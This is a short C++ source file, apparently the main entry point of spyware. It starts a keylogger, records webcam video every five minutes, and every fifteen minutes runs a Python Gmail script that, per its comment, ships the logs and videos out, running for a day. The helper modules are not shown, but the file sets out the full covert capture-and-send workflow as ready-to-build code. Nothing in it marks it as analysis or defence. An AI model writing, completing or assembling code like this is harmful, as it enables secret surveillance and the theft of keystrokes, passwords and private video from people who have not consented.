#include "keylogger.hpp"
#include "webcam.hpp"
#include "scheduler.hpp"
#include <cstdlib>

int main() {
    KeyLogger kl;
    kl.start();

    WebcamRecorder cam;
    schedule_every(std::chrono::minutes(5), [&] { cam.record(30); });

    // ship logs & videos every 15 min via the existing Python script
    schedule_every(std::chrono::minutes(15), [] {
        std::system("python3 modules/gmail_api.py");   // or use pybind11
    });

    // keep the main thread alive
    std::this_thread::sleep_for(std::chrono::hours(24));
    kl.stop();
}
